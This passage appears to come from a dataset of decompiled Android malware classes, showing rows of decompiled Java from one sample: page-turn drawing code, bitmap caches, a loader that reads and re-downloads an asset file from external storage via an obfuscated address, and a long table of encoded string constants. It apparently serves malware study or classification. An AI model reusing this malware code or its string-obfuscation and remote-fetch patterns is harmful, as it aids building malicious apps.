iArr={3355443,-1338821837};     this.z=new GradientDrawable(GradientDrawable.Orientation.RIGHT_LEFT,iArr);     this.z.setGradientType(0);     this.y=new GradientDrawable(GradientDrawable.Orientation.LEFT_RIGHT,iArr);     this.y.setGradientType(0);     this.u=new int[]{-15658735,1118481};     this.x=new GradientDrawable(GradientDrawable.Orientation.RIGHT_LEFT,this.u);     this.x.setGradientType(0);     this.w=new GradientDrawable(GradientDrawable.Orientation.LEFT_RIGHT,this.u);     this.w.setGradientType(0);     this.v=new int[]{-2146365167,1118481};     this.C=new GradientDrawable(GradientDrawable.Orientation.LEFT_RIGHT,this.v);     this.C.setGradientType(0);     this.D=new GradientDrawable(GradientDrawable.Orientation.RIGHT_LEFT,this.v);     this.D.setGradientType(0);     this.B=new GradientDrawable(GradientDrawable.Orientation.TOP_BOTTOM,this.v);     this.B.setGradientType(0);     this.A=new GradientDrawable(GradientDrawable.Orientation.BOTTOM_TOP,this.v);     this.A.setGradientType(0);   }   public PointF a(  PointF pointF,  PointF pointF2,  PointF pointF3,  PointF pointF4){     PointF pointF5=new PointF();     float f=(pointF2.y - pointF.y) / (pointF2.x - pointF.x);     float f2=((pointF.x * pointF2.y) - (pointF2.x * pointF.y)) / (pointF.x - pointF2.x);     pointF5.x=((((pointF3.x * pointF4.y) - (pointF4.x * pointF3.y)) / (pointF3.x - pointF4.x)) - f2) / (f - ((pointF4.y - pointF3.y) / (pointF4.x - pointF3.x)));     pointF5.y=(f * pointF5.x) + f2;     return pointF5;   }   public void a(){     if (this.R == 0) {       a(this.O,this.f186a,this.J);       a(this.O,this.b);     }  else {       a(this.O,this.b,this.J);       a(this.O,this.f186a);     }   }   public void b(){     if (this.d.x > (-this.S) / 2) {       this.U=20;       this.d.x-=10.0f;       this.d.y+=2.0f;     }  else {       this.d.x=this.S;       this.d.y=0.0f;       if (this.R == 0) {         this.U=3000;         this.R=1;       }  else {         this.U=3000;         this.R=0;       }     }     a(this.d.x,this.d.y);   }   @Override protected void onDraw(  Canvas canvas){     canvas.drawColor(-536870912);     this.O.drawColor(-5592406);     c();     a();     if (com.apkmore.rbjatnldymzfiw.v.j.a(this.V).a() == null) {       canvas.drawBitmap(this.N,0.0f,0.0f,this.P);       return;     }     if (com.apkmore.rbjatnldymzfiw.v.j.a(this.V).a().width >= this.H && com.apkmore.rbjatnldymzfiw.v.j.a(this.V).a().height >= this.I) {       canvas.drawBitmap(this.N,(this.H / 2) - (this.f186a.getWidth() / 2),(this.I / 2) - (this.f186a.getHeight() / 2),this.P);     }  else     if (com.apkmore.rbjatnldymzfiw.v.j.a(this.V).a().width >= this.H || com.apkmore.rbjatnldymzfiw.v.j.a(this.V).a().height >= this.I) {       canvas.drawBitmap(this.N,0.0f,0.0f,this.P);     }  else {       canvas.drawBitmap(this.N,0.0f,0.0f,this.P);     }   }   @Override protected void onMeasure(  int i,  int i2){     setMeasuredDimension(this.S,this.T);   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.v.d\t.code","public class t extends Thread {   final s f187a;   private boolean b=false;   public t(  s sVar){     this.f187a=sVar;   }   public void a(  boolean z){     this.b=z;   }   @Override public void run(){     int i;     while (this.b) {       try {         this.f187a.b();         this.f187a.postInvalidate();         i=this.f187a.U;         Thread.sleep(i);       }  catch (      InterruptedException e) {         e.printStackTrace();       }     }     super.run();   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.v.d\u.code","public class u {   private static Map f188a=new HashMap();   private static Map b=new HashMap();   private static int c;   public static Bitmap a(  Context context,  String str){     Bitmap b2;     if ((!f188a.containsKey(str) || (b2=(Bitmap)((SoftReference)f188a.get(str)).get()) == null) && (b2=b(context,str)) != null) {       f188a.put(str,new SoftReference(b2));     }     return b2;   }   public static Drawable a(  Context context,  Bitmap bitmap){     if (c == 0) {       DisplayMetrics displayMetrics=new DisplayMetrics();       ((WindowManager)context.getSystemService(""window"")).getDefaultDisplay().getMetrics(displayMetrics);       c=displayMetrics.densityDpi;     }     BitmapDrawable bitmapDrawable=new BitmapDrawable(bitmap);     a(bitmapDrawable);     return bitmapDrawable;   }   private static void a(  BitmapDrawable bitmapDrawable){     bitmapDrawable.setTargetDensity((int)(c * ((c * 1.0f) / 240.0f)));   }   public static android.graphics.Bitmap b(  android.content.Context r4,  java.lang.String r5){     throw new UnsupportedOperationException(""Method not decompiled: com.apkmore.rbjatnldymzfiw.v.d.u.b(android.content.Context, java.lang.String):android.graphics.Bitmap"");   }   public static Drawable c(  Context context,  String str){     Drawable drawable;     if (b.containsKey(str) && (drawable=(Drawable)((SoftReference)b.get(str)).get()) != null) {       return drawable;     }     Bitmap b2=b(context,str);     if (b2 == null) {       return null;     }     Drawable a2=a(context,b2);     b.put(str,new SoftReference(a2));     return a2;   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.v.e\a.code","public class a {   private static int d;   private static int f190a=0;   private static Map b=new HashMap();   private static Map c=new HashMap();   private static final int[] e={0,2911,3935,4980,5800,6955,12202,17545,21034,28807,41610,42040,45264,48179,54261,60483,61410};   public static Bitmap a(  Context context,  int i){     Bitmap b2;     if ((!b.containsKey(Integer.valueOf(i)) || (b2=(Bitmap)((SoftReference)b.get(Integer.valueOf(i))).get()) == null) && (b2=b(context,i)) != null) {       b.put(Integer.valueOf(i),new SoftReference(b2));     }     return b2;   }   public static Drawable a(  Context context,  Bitmap bitmap){     if (bitmap == null) {       return null;     }     if (d == 0) {       DisplayMetrics displayMetrics=new DisplayMetrics();       ((WindowManager)context.getSystemService(""window"")).getDefaultDisplay().getMetrics(displayMetrics);       d=displayMetrics.densityDpi;     }     BitmapDrawable bitmapDrawable=new BitmapDrawable(bitmap);     a(bitmapDrawable);     return bitmapDrawable;   }   private static void a(  BitmapDrawable bitmapDrawable){     bitmapDrawable.setTargetDensity((int)(d * ((d * 1.0f) / 240.0f)));   }   public static synchronized Bitmap b(  Context context,  int i){     File file;     RandomAccessFile randomAccessFile;     Bitmap bitmap;     RandomAccessFile randomAccessFile2=null; synchronized (a.class) {       try {         try {           try {             String str=Environment.getExternalStorageDirectory() + ""/"" + b.e+ ""/""+ b.bE+ b.bD;             file=new File(str);             try {               if (file.exists()) {                 randomAccessFile=new RandomAccessFile(file,""r"");                 try {                   randomAccessFile.seek(e[i - 1]);                 }  catch (                Exception e2) {                   e=e2;                   e.printStackTrace();                   System.gc();                   if (file.exists()) {                     file.delete();                   }                   if (randomAccessFile != null) {                     try {                       randomAccessFile.close();                     }  catch (                    IOException e3) {                     }                   }                   bitmap=null;                   return bitmap;                 }               }  else {                 randomAccessFile=null;               }               byte[] bArr=new byte[e[i] - e[i - 1]];               randomAccessFile.read(bArr,0,bArr.length);               bitmap=BitmapFactory.decodeByteArray(bArr,0,bArr.length);               if (bitmap != null || f190a >= 3) {                 f190a=0;                 if (randomAccessFile != null) {                   try {                     randomAccessFile.close();                   }  catch (                  IOException e4) {                   }                 }               }  else {                 if (file.exists()) {                   file.delete();                 }                 new com.apkmore.rbjatnldymzfiw.v.a.a().a(b.bC,str,new Handler());                 f190a++;                 bitmap=b(context,i);                 if (randomAccessFile != null) {                   try {                     randomAccessFile.close();                   }  catch (                  IOException e5) {                   }                 }               }             }  catch (            Exception e6) {               e=e6;               randomAccessFile=null;             }           }  catch (          Throwable th) {             th=th;             if (0 != 0) {               try {                 randomAccessFile2.close();               }  catch (              IOException e7) {               }             }             throw th;           }         }  catch (        Exception e8) {           e=e8;           file=null;           randomAccessFile=null;         }       }  catch (      Throwable th2) {         th=th2;       }     }     return bitmap;   }   public static Drawable c(  Context context,  int i){     Drawable drawable;     if (c.containsKey(Integer.valueOf(i)) && (drawable=(Drawable)((SoftReference)c.get(Integer.valueOf(i))).get()) != null) {       return drawable;     }     Bitmap b2=b(context,i);     if (b2 == null) {       return null;     }     Drawable a2=a(context,b2);     c.put(Integer.valueOf(i),new SoftReference(a2));     return a2;   }   public static NinePatchDrawable d(  Context context,  int i){     try {       Bitmap a2=a(context,i);       if (a2 != null) {         byte[] ninePatchChunk=a2.getNinePatchChunk();         if (!NinePatch.isNinePatchChunk(ninePatchChunk)) {           return null;         }         Rect rect=new Rect();         NinePatchDrawable ninePatchDrawable=new NinePatchDrawable(a2,ninePatchChunk,f.a(ninePatchChunk).f193a,null);         ninePatchDrawable.getPadding(rect);         if (d == 0) {           DisplayMetrics displayMetrics=new DisplayMetrics();           ((WindowManager)context.getSystemService(""window"")).getDefaultDisplay().getMetrics(displayMetrics);           d=displayMetrics.densityDpi;         }         ninePatchDrawable.setTargetDensity((int)(d * ((d * 1.0f) / 240.0f)));         return ninePatchDrawable;       }     }  catch (    Exception e2) {       e2.printStackTrace();     }     return null;   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.v.e\b.code","public final class b {   public static final String f191a=e.a(""sÂ¼Ã”Ã·Ã¿Ã£Ã¯Ã»Ã¼ÃŽÃ–Ã¶Ä“Ã¬Ã‚Ã§Ã Ã–Ã²Â¹ÃŽÃŒÃžÃ‡ÃŠÂµÃ¬e"");   public static final String b=e.a(""sÃºÃ¼Ã­e"");   public static final String c=e.a(""sÃ·Ã€Ã²Ã¿e"");   public static final String d=e.a(""sÃ°Ã»ÃªÄ‰ÃŸÃ¥Ã¾Ã…ÄˆÃ–e"");   public static final String e=e.a(""sÃ±Ä‚Ä€Ä‰Ã�Ã¯Ã³Ã¼ÃŽÂ«Ã¿ÃŽÃ®Äƒe"");   public static final String f=e.a(""sÃ¯Ä‚Ä�ÃºÃ”Ã°Ã±ÄŠÄ„Ã•Ä„ÄŒÃ¸Ã¸Ã²Ã•e"");   public static final String g=e.a(""sÃ¯Ä‚Ä�ÃºÃ”Ã°Ã±ÄŠÄ„Ã•Ä„ÄŒÃ¸Ã¸Ã²Ã•Ã…Ä�Ã«ÃµÃ¨e"");   public static final String h=e.a(""sÃ¯Ä‚Ä�ÃºÃ”Ã°Ã±Ã¹Ä‹ÃžÃ´ÄŒÃ¾Ãºe"");   public static final String i=e.a(""sÃ¯Ä‚Ä�ÃºÃ”Ã°Ã±Ä‹Ä“Ã“Ä‰Ä„Ã¾e"");   public static final String j=e.a(""sÃ¯Ä‚Ä�ÃºÃ”Ã°Ã±Ã¼ÄŽÃ©ÄƒÄ‹ÃºÃ´Ã¨Ã’Ã¢Ã½Ã½e"");   public static final String k=e.a(""sÃ¯Ä‚Ä�ÃºÃ£Ã¥ÃµÄ‡ÄŒÃŸÃºÄ�Ã¯Ã²Ã¨Ã Ã©Ã»Ã¶Ã°Ã¤Ã¾ÃºÃ¶Ã¤Ä‹e"");   public static final String l=e.a(""sÂ¼Ã·Ã¸Ä’ÃŸÃ¬Ä�Ã¹ÄƒÂ¡Ã¸Ä�e"");   public static final String m=e.a(""sÂ¾ÃƒÂ·Ã‹\u009fÂ°Ã€Ã‰Ã–Â¤e"");   public static final String n=e.a(""sÂ¾ÃƒÂ·Ã‹\u009fÂ°Ã€ÃŠÃ�Â¢e"");   public static final String o=e.a(""sÃ¯Ä‚Ä�Ã¾Ã¡Ã¤Ä�Ä�Ä�ÃžÄ„Ä€Ã¯Ä†e"");   public static final String p=e.a(""sÃ¯Ä‚Ä�Ã¾Ã¡Ã¤Ä�Ä�Ä�ÃžÄ„Ä€Ã¯Ä†e"");   public static final String q=e.a(""sÃ¬Ã¼Ã­e"");   public static final String r=e.a(""sÄ‚Ä…Ãµe"");   public static final String s=e.a(""sÃ³Ã¼ÃµÄ€e"");   public static final String t=e.a(""sÄ€Ã¼ÄƒÄ€e"");   public static final String u=e.a(""sÄ�Ä‚Ã½Ã¼Ã�ÃŸÄ…Ä�Ä™Ã—e"");   public static final String v=e.a(""sÄ€Ä‡ÃªÄ�Ã–e"");   public static final String w=e.a(""sÃ»Ã¸Ã½Ä’Ã Ã²Ã½Ã·ÄˆÃ Ã»ÄŽe"");   public static final String x=e.a(""sÃ³Ã¼ÃµÄ€Ã�Ã®Ã³Ä…Ä„e"");   public static final String y=e.a(""sÃ±Ä‚Ä€Ä‰Ã�Ã¯Ã³Ã¼Ã¾ÃŸÄ„ÄƒÃ°e"");   public static final String z=e.a(""sÃ²Ã§ÃªÄ‚e"");   public static final String A=e.a(""sÃ°Ä…Ã®Ã¼Ã¥Ã¥Ä†Ä�ÄŒÃ—e"");   public static final String B=e.a(""sÃ·Ã¼Ã¾Ä…Ã¦Ã®e"");   public static final String C=e.a(""sÃ—Ã²Ã•ÃªÂ¸e"");   public static final String D=e.a(""sÄ€Ä‡ÃªÄ�Ã¥Â Ä„Ã½Ä�Ã§ÃºÄ’Ã¿Â´e"");   public static final String E=e.a(""sÃ¶Ã¶Ã¸Ä‰\u009fÃ°Ä€Ã¿Ã�Ã–Ã¶Ä“e"");   public static final String F=e.a(""sÃ°ÄƒÂ¹Ã‰Ã¡Ã®Ã¹Ã†ÄƒÃ“Ä‰e"");   public static final String G=e.a(""sÃ°ÄƒÂºÃ‰Ã¡Ã®Ã¹Ã†ÄƒÃ“Ä‰e"");   public static final String H=e.a(""sÃ°Äƒe"");   public static final String I=e.a(""sÂ»ÄƒÃ·Ä‚\u009fÃ¤Ã³ÄŒe"");   public static final String J=e.a(""sÂ»Ã½Ã¹Ä‚\u009fÃ¤Ã³ÄŒe"");   public static final String K=e.a(""sÂ»Ã´Ã¹Ä†e"");   public static final String L=e.a(""sÂ»Ä‡Ã¶Ä‹e"");   public static final String M=e.a(""sÂ¾Ã�Ã­Ã¼Ã¥e"");   public static final String N=e.a(""sÃ½Ã´Ã¬Ä†Ã’Ã§Ã·Ã’e"");   public static final String O=e.a(""så°–è¥˜å°•æŠ«e"");   public static final String P=e.a(""sÃºÃ¸Ã¼ÄŽÃ’Ã§Ã·e"");   public static final String Q=e.a(""sÄ„Ã¼Ã¯Ä„e"");   public static final String R=e.a(""sÃ°Ä‡Ä€Ã¼Ã¡e"");   public static final String S=e.a(""sÃ°Ä€Ä€Ã¼Ã¡e"");   public static final String T=e.a(""sÃ€ÃºÄ€Ã¼Ã¡e"");   public static final String U=e.a(""sÄ‚Ä�Ã²Ä’Ã’Ã°e"");   public static final String V=e.a(""sÂ¼Ã·ÃªÄ�Ã’Â¯Ã¶Ã¹Ä“Ã“e"");   public static final String W=e.a(""sÃ°Ã»Ã¶ÄŠÃ•Â Ã‰Ã�Ã–e"");   public static final String X=e.a(""sÃ°Ä‚Ã·Ä�Ã–Ã®Ä†Ã’ÃŽÂ¡Ã¹ÄŽÄ‚Ä�Ã°Ã Ã“Ã±Ã½Â°Ã§Ä‰Ä�Ã´Ã Ä‡Ã®Ã­e"");   public static final String Y=e.a(""sÃšÄ‚Ã«Ä„Ã�Ã¥Â²Ã«ÄŽÃžÄŠÄ“Ã´Ä‚Ã²e"");   public static final String Z=e.a(""sÃ¿Ã¸ÃºÄ�Ã–Ã³Ä†Ã¡Äƒe"");   public static final String aa=e.a(""sÃ®Ã·Ã¿Ä€Ã£Ã´Ã›Ã¼e"");   public static final String ab=e.a(""sÃ°ÄƒÂ©ÄŽÃ¥Ã¡Ä†Ä�Ä„e"");   public static final String ac=e.a(""sÃ¶Ä†Ã�ÄŠÃ¨Ã®Ã¾Ä‡Ä€Ã–Ã¾Ä�Ã²e"");   public static final String ad=e.a(""sÄ€Ã»Ã¸Ä�Ã¥Ã£Ä‡ÄŒe"");   public static final String ae=e.a(""sÃŸÃ¸Ã¬Ä€ÃšÃ¶Ã·ÄŠe"");   public static final String af=e.a(""sÃ±Ã™Ã²Ä‰ÃšÃ³Ãºe"");   public static final String ag=e.a(""sç…†åŠŽæ‹œå¾›e"");   public static final String ah=e.a(""sç…†åŠŽå°’è¥ e"");   public static final String ai=e.a(""sæ¯°åž»äº”é€˜e"");   public static final String aj=e.a(""sç½´ç¾€äº”é€˜e"");   public static final String ak=e.a(""säº˜é€�å°•æŠ«e"");   public static final String al=e.a(""sç¿žç½¯å¾‹å»“ï½½äº‹é€�ç½ æ°�e"");   public static final String am=e.a(""sç¿žç½¯å¾‹å»“ï½½äº‹é€�æœšåƒ»e"");   public static final String an=e.a(""sæ†¬è²µæ„±å²”e"");   public static final String ao=e.a(""sçœ‘æ—‚æŽŠï¾œe"");   public static final String ap=e.a(""sÃ•Ãœï¾•æŠ¬åŠ‹äº‹é€�å°¡è¥¤ä»¸e"");   public static final String aq=e.a(""sï¾™æ†²è©’äº¨é–Šï¾ŒçŒ‹æ†§æ‘‡è�‚ç½®ä¿¿ï¾Œäºžé€�åž¡åž²ï¾§e"");   public static final String ar=e.a(""såŠ“ä¼¾ç½¢æž¦å�¼e"");   public static final String as=e.a(""sç¿žç½¯é��å�¹æ˜žç„¹æ˜‚æ�†äº¬æ¯•ç¤ƒe"");   public static final String at=e.a(""sæžšåŒ´å›±äº¨æ– æŽ�æ˜¿ç…‘ï¾«éˆ¿æ™…äºªé€ˆe"");   public static final String au=e.a(""sÃ Ã—å�ªå¯³å„™ç«ºéš†äº¥è¹’ï½¾è²ŒåŠ¿é›¯äº“ä¼Ÿæ—¸ä½¨ä»˜å’˜åˆŽé‰�è±¯ï¾še"");   public static final String av=e.a(""så’šçªƒe"");   public static final String aw=e.a(""sç´ˆå že"");   public static final String ax=e.a(""sç‹•æž¿e"");   public static final String ay=e.a(""så¦´å²¢e"");   public static final String az=e.a(""sè±ºèª“e"");   public static final String aA=e.a(""sæšƒéš‡e"");   public static final String aB=e.a(""sç°�ä½že"");   public static final String aC=e.a(""säº˜é€�ä¼�æ¯¿å¼…ç–¨çœ–ç—€æ‹–é�Šäº é€œä¼‘e"");   public static final String aD=e.a(""så‡šè·Œäº”é€˜e"");   public static final String aE=e.a(""sæ‹ å¾“e"");   public static final String aF=e.a(""sÃµÄ‡Ã½Ä‹Â«Â¯Ã�Ã»Ã�Ã Ã¾Ä�Ã°ÃµÃ³Ã©Â Ã°Ã¸Â°Ã¤Ã¾Ä†Ã¯Ã¢Ã‡Ã¯Ã¬Ã©Â´Ä€Ã¥Ä�Ã¼Ã¸Ä‰e"");   public static final String aG=e.a(""sÃµÄ‡Ã½Ä‹Â«Â¯Ã�Ã¹ÄƒÃŸÃ¾Ä�Â¹Ä�Ã­ÃŸÃ—Ã¯Ã¹Ã¹Â±Ã½Ä‡ÂµÃ•Ã¼ÃºÃ²Ã§ÂµÄ‘Ã¥Ã®Ã·Â·Ã¼Ã”Ã´Ã»Ä‡Ä�e"");   public static final String aH=e.a(""sÂ½Ã„Â»ÃŽÂ¥ÂµÃˆÃ�Ã—Â«Ã¶Ä�Ã®Ã·Ã©Ã—Â¢Â¾Â¼Â´Â·Ã�Ã�Â½Â¬Ã‘Ã®Ã«ÃœÃªÄ„Ã¨e"");   public static final String aI=e.a(""sÃ¶Ä†Ã¨ÄŽÃªÃ³Ä†Ã½ÄŒÃ“Ä…Ä�e"");   public static final String aJ=e.a(""sÃ¿ÄˆÃ·Ä‰ÃšÃ®Ã¹Ã·Ä€Ã¢Ä…Ã¾Ã¹Ã´Ã±Ã–e"");   public static final String aK=e.a(""sÄ€Ä‡Â·Ã¿Ã’Ã´e"");   public static final String aL=e.a(""sÄ�ÄŒÃ¹Ä€e"");   public static final String aM=e.a(""sÃ½Ã´Ã¬Ä†ÃŸÃ¡Ã¿Ã½e"");   public static final String aN=e.a(""sÃ¶Ä�Ã½ÄƒÃ–Ã†Ã³Ã»Ä„Ã†ÄŽÄ�Ã°e"");   public static final String aO=e.a(""sÃºÄˆÃ¼Ä�\u0091Â±Ã‚Â¸ÄŒÃ›ÄƒÄ”Ã¿Ã¸Â¤Ã¤ÃšÃ¼Ä�Â¡Ã·Ä‚Ã¾Â¦Ã§Ã»Ã¿Ã®ÃžÃ´Â¿Ã£Ã±e"");   public static final String aP=e.a(""sÄ‰Â¶Â³e"");   public static final String aQ=e.a(""sÃ³Ã¼ÃµÄ€Ã�Ã¡Ä†Ä€e"");   public static final String aR=e.a(""sÄ�Ã´Ã°e"");   public static final String aS=e.a(""sÄ�Ã»Ã®Â»ÃžÃ¡Ã»Ä†Â¿Ã¦Ä‡Ä„Ã¬Ã·Â¤ÃšÃ–\u00adÃ³Ã´Â£e"");   public static final String aT=e.a(""sÃºÃ¸Ã¼ÄŽÃ’Ã§Ã·e"");   public static final String aU=e.a(""sÄ‚Ä…Ã²e"");   public static final String aV=e.a(""sÄƒÃ¼Ã¼Ä„Ã“Ã©Ã¾Ä�Ä“Ã«e"");   public static final String aW=e.a(""sÃ±Ã¸Ã¼Ã¾Ã£Ã©Ä‚ÄŒÄˆÃ¡Äƒe"");   public static final String aX=e.a(""sÃµÃ¼Ã·Ä�e"");   public static final String aY=e.a(""sÃºÃ¼Ã¶Ä€Ã¥Ã¹Ä‚Ã½e"");   public static final String aZ=e.a(""sÃ®ÄƒÃ¹Ä‡ÃšÃ£Ã³ÄŒÄˆÃ¡ÄƒÃŽÄ�Ä�Ã¨\u009fÃ“Ã»Ã®Ã³Ã²ÄƒÃ½Â´Ã¤Ã¹Ã°Ã´ÃšÃ­Ä„Â¯Ã®Ä…Ã¬ÄƒÃšÃ¶Ã·e"");   public static final String ba=e.a(""sÄ�Ã¼Ã½Ä‡Ã–e"");   public static final String bb=e.a(""sÄ�Ã¸Ä�Ä�Â Ã°Ã¾Ã¹ÄˆÃ e"");   public static final String bc=e.a(""sÃŽÃ¶Ã¬Ä€Ã¡Ã´Â¿ÃªÄ€Ã Ã¼Ä„Ã¾e"");   public static final String bd=e.a(""sÃ�Ä‚Ã·Ä�Ã–Ã®Ä†Ã…Ã±Ã“ÄƒÄ†Ã°e"");   public static final String be=e.a(""sÃ¨Ã€Â¸Ã¸e"");   public static final String bf=e.a(""sÃŽÃ¶Ã¬Ä€Ã¡Ã´e"");   public static final String bg=e.a(""sÃ¶Ä€ÃªÄ‚Ã–Â¯Ã¹Ä�Ä…\u009eÂµÄˆÃ¸Ã´Ã«Ã–Â¡Ã·ÃºÃ¦ÃªÃ†Â¹Ã¯Ã¡Ã¹Ã´Ã®Â¨Ã¶Ä‰Ã²Ã²ÃºÂµÂ»ÃšÃ­Ã³Ã¿Ä„Â¡Ä…Ä‰Ã»Ã¸Ã«\u009d\u0092Ã®ÃºÃ±Ã¯ÄƒÃ¼Ã§Ã¨Ä�Ã¼Ã·Â¨Ã¾ÃŒÃµÃµÄ‚Ã¬Ä†Ã¨Ã¡ÄˆÃ½ÃŒÃ˜Ä�Ä€Ã¾Ã»Â°\u0091Ã“Ã½ÃºÃ­Ã¬Ã½ÃºÃºÃ�Ä‡Ã»Â¸Ã±Ã§ÄŒÃ®Â¸Ä‹Ã¶Ä‡\u009dÂ Ã³ÄˆÄ�ÃžÃ¾Ä‚Ã¬Ä‡Ã­Ã Ã Â¼Ä€Ã¯Ã§ÃˆÄ†Ã¹Â¡Ä�Ã½Ã¼Ã�ÃµÄ‚Ã·ÃºÃ¸Ã·Ä�\u009dÂ Ã³ÄˆÄ�ÃžÃ¾Ä‚Ã¬Ä‡Ã­Ã Ã Â¼Ä‚Â®Ã°Ä�Ã†Ã¾Ã–Ã¹Ã½Âµ\u0099Ã§Ä�Ã²Ã¹Ã¼Ã¬Ã¼Ã¥Ã©Ä�Ä†ÃŽÃªÃ‚ÄŒÃ¾Ã€Ã¥Ã¡Ã¢Ã¹Ã³Ã¤Ã¤ÄŽÄ‚ÃµÃ¢Ã„\u00adÃªÃ©Ã¶Ä‹Ã«Ã°Ã´Ã½Ä„Ã Ã®Ã�ÄŽÄ�Ã–ÃƒÄŒÃ¾Ã€Ã©Ã©Ã•Ã²Ã¶\u00adÂ£Ã»Ä‰Ã¶Ã Ä�Ã°ÃªÃ­Ã¯ÄŽÃ°Â¼Ä‰Ã·Ã¿\u009fÃ­Ä…Ã…Ä�Ã¡ÄŒÄ„Ã½ÄƒÃ³ÃšÃ Ä�Â¶Â¡Ã¤ÄŠÄ‰Ã²Ã�Ã»Ã®Ã½Ã¢ÃµÄ�Â±ÃºÄ†Ä€ÄŠÃ£Ã¤Â¾Â¸Ã‰Â¡Â¿e"");   public static final String bh=e.a(""sÃŽÃ¶Ã¬Ä€Ã¡Ã´Â¿Ã¤Ä€Ã Ã¼Ä”Ã¬ÃºÃ©e"");   public static final String bi=e.a(""sÄ‡Ã»Â¶ÃžÂ¿e"");   public static final String bj=e.a(""sÃ�Ã»ÃªÄ�Ã¤Ã¥Ä†e"");   public static final String bk=e.a(""sÃ¢Ã§Ã�ÃˆÂ©e"");   public static final String bl=e.a(""sÃ¯ÄŒÃ½Ä€Ã¤Â½e"");   public static final String bm=e.a(""sÃŸÃ´Ã·Ä‚Ã–e"");   public static final String bn=e.a(""sÃ¯ÄŒÃ½Ä€Ã¤Â½Ã‚Ã…e"");   public static final String bo=e.a(""sÃ¢Ä†Ã®Ä�\u009eÃ�Ã¹Ã½Ä�Ã¦e"");   public static final String bp=e.a(""sÃšÄ‚ÄƒÄ„Ã�Ã¬Ã³Ã‡Ã“Â Ã…Â¿Â³Ã¶Ã³ÃžÃ¢Ã®Ã¾ÃªÃ¥Ä†Ã¾Ã�\u0094Ã¥Ã Ã’Â¾Â¦Ã—Â°Â½ÃŽÂ©Ã²ÃšÃ®Ã¶Ä‡Ä–Ã¥ÂµÃ­ÃŸÂ³Â¹\u009fÂ¤ÃˆÂªÃ•ÃµÄƒÃ½Ã«Ã¢ÄŒÂ¼Â½Â§Â¶ÃšÂ¢Â»Ã¡ÃŽÃ¯\u0091ÃƒÃžÃªÂ¿Â£ÃƒÃ�Â¹Ã‡Â·Â£Â¤ÃˆÂªÂ¯Ã‘ÃŸÃ­Â¦Â·Ã¤ÃŸÂ©Â«Â´Ã�Â°Ã‚ÃƒÃ€Ã�Â¨Â»Â²Ã†Ã­Â·Ã©Â¿ÃŽÃŸÃ–\u0091Â¥Â»ÂºÂ¯Â³ÃŽÃŽÂ¶ÂªÃ†Ã€Â¹Â´Â¦Ã�Ã�Ã’Ã§Â©ÃžÂ½Ã’Â²Ã‹Ã�Â¢ÃƒÃ“Ã€ÃƒÂº\u009fÂ¤Â¾Â¿Â³Â¾ÂºÃ‡Ã”Â¹Ã¬\u00adÃŒÃ…Ã˜Â¿ÂµÂ»ÃˆÂ·ÃŽÂ¡Â·Ã„Ã‘Ãˆe"");   public static final String bq=e.a(""sÃ�Ä‚Ã·Ä‰Ã–Ã£Ä†Ä�ÄŽÃ e"");   public static final String br=e.a(""sÃ˜Ã¸Ã®Ä‹\u009eÃ�Ã¾Ä�Ä•Ã—e"");   public static final String bs=e.a(""sÃšÃ—Â¾e"");   public static final String bt=e.a(""sÃ¨ÃŸe"");   public static final String bu=e.a(""sÃµÄ‡Ã½Ä‹e"");   public static final String bv=e.a(""sÃ•Ä‡Ã½Ä‹Â´Ã¯Ä€Ä†Ä„Ã•Ä‰ÄˆÃºÄ�Ã•Ã¦Ã—Ä‚Ã¯Ã�e"");   public static final String bw=e.a(""sÃ°Ä‡Ä€Ã¼Ã¡ÂºÃµÃ¼ÄŒÃ“e"");   public static final String bx=e.a(""sÂ°ÃˆÂ»Ã”Â¨Ã¢Ã·e"");   public static final String by=e.a(""sÃ‘Ã˜Ãœe"");   public static final String bz=e.a(""sÃ¶Ä�Ã¿Ã¼Ã�Ã©Ã¶Â¸Ä�Ã›ÄƒÄ„Â«ÄƒÃ¥Ã¥Ã•ÃµÃ„e"");   public static final String bA=e.a(""sÂ²Â»Ã¥Ã¿\u009bÂ©e"");   public static final String bB=e.a(""sÃ©Ã·Â´e"");   public static final String bC=e.a(""sÃµÄ‡Ã½Ä‹Â«Â¯Ã�Ä�ÄŒÃ™ÃƒÄ�Ã´Ä�Ã©Ã“Ã¡Ä…Â¸Ã¤Ã±Ã‰Ã½Ã§Ã¨Ã‡Ã°Â¸ÂªÂ´Ã�Â°Ã…Ã‚ÂºÃ‹\u009fÃ¤Ã³ÄŒe"");   public static final String bD=e.a(""sÂ¾ÃƒÂ·Ã¿Ã’Ã´e"");   public static final String bE=e.a(""sÂ¾Ã�Â¹Ã‰Â¤Â¯e"");   public static final String bF=e.a(""sÃ½Ä…Ã¸Ä‚Ã£Ã¥Ä…Ä‹e"");   public static final String bG=e.a(""sÃ®ÃµÃ¸Ä�Ã¥e"");   public static final String bH=e.a(""sÃšÃ¦e"");   public static final String bI=e.a(""sÃ³Ã¼ÃµÄ€e"");   public static final String bJ=e.a(""sÃ¿ÄŠe"");   public static final String bK=e.a(""sÂ»Ã�Â·e"");   public static final String bL=e.a(""sÃ®Ä�Ã­Ä�Ã Ã©Ã¶Ã†Ä�Ã—Ä‰Ã�Ã®Ä‚Ã²ÃŸÂ Ã�Ã™Ã�Ã‘ÃŸÃœÃšÂ½Ã®Ã–Ã�Ã’Ã¥Ã¢ÃŠÃŽÃ¡Ã�Ã e"");   public static final String bM=e.a(""sÃ³Ã¼ÃµÄ€ÃŸÃ¡Ã¿Ã½e"");   public static final String bN=e.a(""sÄ‚Ä�Ã´Ä‰Ã Ã·Ä€e"");   public static final String bO=e.a(""sÄ�Ä…Ã¾Ä€e"");   public static final String bP=e.a(""sÃ»ÄˆÃµÄ‡e"");   public static final String 